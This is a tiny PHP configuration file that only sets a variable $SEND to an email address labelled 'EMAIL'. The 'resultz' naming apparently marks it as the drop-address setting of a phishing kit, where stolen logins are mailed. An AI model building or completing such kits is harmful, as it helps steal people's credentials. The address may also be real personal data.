<?php

$SEND="resultz101@zoho.com"; //  EMAIL


?>